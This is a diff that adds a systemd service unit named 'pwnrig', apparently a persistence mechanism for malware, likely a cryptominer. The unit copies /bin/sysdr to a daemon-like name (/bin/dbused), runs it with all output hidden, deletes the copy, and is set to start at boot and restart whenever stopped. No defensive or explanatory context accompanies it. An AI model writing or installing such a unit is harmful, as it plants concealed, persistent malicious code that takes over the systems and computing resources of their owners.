@@ -1,0 +1,14 @@
+[Unit]
+Description=pwnrig
+
+Wants=network.target
+After=syslog.target network-online.target
+
+[Service]
+Type=forking
+ExecStart=/bin/bash -c 'cp -f -r -- /bin/sysdr /bin/dbused 2>/dev/null && /bin/dbused -c  >/dev/null 2>&1 && rm -rf -- /bin/dbused 2>/dev/null'
+Restart=always
+KillMode=process
+
+[Install]
+WantedBy=multi-user.target
